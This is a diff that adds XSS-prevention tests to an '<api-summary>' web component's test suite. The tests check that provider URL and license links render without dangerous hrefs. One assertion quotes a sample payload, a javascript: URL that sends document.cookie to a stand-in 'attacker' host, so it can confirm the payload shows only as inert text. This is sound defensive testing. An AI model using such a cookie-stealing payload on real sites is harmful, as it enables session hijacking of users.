@@ -221,6 +221,70 @@ describe('<api-summary>', function() {
         });
       });
 
+      describe('Prevent XSS attacks', () => {
+        let amf;
+        let element;
+
+        before(async () => {
+          amf = await AmfLoader.load(compact, 'prevent-xss');
+        });
+
+        beforeEach(async () => {
+          element = await basicFixture();
+          element.amf = amf;
+          await aTimeout();
+        });
+
+        it('provider section is rendered', () => {
+          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
+          assert.ok(node);
+        });
+
+        it('renders provider name', () => {
+          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
+          assert.dom.equal(node, `<span class="provider-name">Wally</span>`);
+        });
+
+        it('renders provider email', () => {
+          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
+          assert.dom.equal(
+            node,
+            `<a class="app-link link-padding provider-email" href="mailto:wallythebest@wally.com">
+            wallythebest@wally.com
+          </a>`
+          );
+        });
+
+        it('renders provider url without malicious href', () => {
+          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
+          assert.dom.equal(
+            node,
+            `<a class="app-link provider-url" target="_blank">
+              javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
+          );
+        });
+
+        it('renders license region', () => {
+          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
+          assert.ok(node);
+        });
+
+        it('renders license without malicious href', () => {
+          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
+          assert.dom.equal(
+            node,
+            `<a class="app-link" target="_blank">
+            I swear if you click below you will have the most amazing experience ever. I promise.
+          </a>`
+          );
+        });
+
+        it('Renders ToS region', () => {
+          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
+          assert.ok(node);
+        });
+      });
+
       describe('Endppoints rendering', () => {
         let element;
         let amf;
